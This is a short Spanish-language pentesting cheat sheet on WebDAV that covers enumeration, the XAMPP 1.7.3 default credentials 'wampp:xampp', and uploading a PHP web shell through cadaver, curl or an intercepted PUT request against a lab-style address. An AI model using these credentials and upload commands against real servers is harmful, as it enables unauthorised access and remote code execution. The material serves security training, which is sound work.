# WebDav Pentesting

## QUE ES WEBDAV

WebDav significa **_creación y control de versiones distribuidas en la web,_** que es una extensión del protocolo de transferencia de hipertexto que permite a los clientes realizar operaciones remotas de creación de contenido web. Brinda la capacidad de crear un archivo o una carpeta, editar un archivo en su lugar, copiar, mover o eliminar un archivo en un servidor web remoto. Utiliza el puerto 80 para acceso sin cifrar y el puerto 443 para acceso seguro. Permite a los usuarios acceder a archivos en la nube o archivos en un servidor separado en tiempo real, sin ningún problema de descarga, almacenamiento en caché, edición y carga.

en resumen: mas o menos como un FTP.

## ENUMERACION

Por lo general en el puerto 80 y 443 puede existir una carpeta llamada **webdav** (muy descriptiva).

### CREDENCIALES POR DEFECTO

-   El complemento WebDAV para el servidor Apache incluido con XAMPP versión 1.7.3 o inferior está habilitado de forma predeterminada.
-   las credenciales por defecto son `wampp:xampp`

### ANALIZANDO LA PETICION

el header `Authorization` contiene el usuario y contraseña (user:pass) en base64.

![https://raw.githubusercontent.com/kriko69/Pentesting/master/hacking_web/WebDav/1.png](https://raw.githubusercontent.com/kriko69/Pentesting/master/hacking_web/WebDav/1.png)

puede validar si los metodos PUT o MOVE estan habilitados para la carga remota de archivos:

![https://raw.githubusercontent.com/kriko69/Pentesting/master/hacking_web/WebDav/2.png](https://raw.githubusercontent.com/kriko69/Pentesting/master/hacking_web/WebDav/2.png)

## EXPLOTACION

### CADAVER

Es como una consola FTP para webdav: (pedira credenciales si fuera necesario `wampp:xampp`)

```bash
cadaver http://10.10.10.10/webdav

put shell.php
```

ahora si buscamos el carchivo cargado podemos invocar una shell

### CURL

Si el Verbo MOVE esta habilitado:

```bash
curl -u wampp:xampp -T shell.php http://10.10.10.10/webdav/
```

### VERBO PUT

interceptando la peticion con burp y si admite el metodo PUT puede cargar un archivo:

![https://raw.githubusercontent.com/kriko69/Pentesting/master/hacking_web/WebDav/3.png](https://raw.githubusercontent.com/kriko69/Pentesting/master/hacking_web/WebDav/3.png)

## FUENTE

- [http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html](http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html)
- [https://shahjerry33.medium.com/rce-via-webdav-power-of-put-7e1c06c71e60](https://shahjerry33.medium.com/rce-via-webdav-power-of-put-7e1c06c71e60)
- [https://medium.com/@agrigoletto/tryhackme-dav-writeup-1df60813207c](https://medium.com/@agrigoletto/tryhackme-dav-writeup-1df60813207c)
- [https://book.hacktricks.xyz/pentesting/pentesting-web/put-method-webdav](https://book.hacktricks.xyz/pentesting/pentesting-web/put-method-webdav)

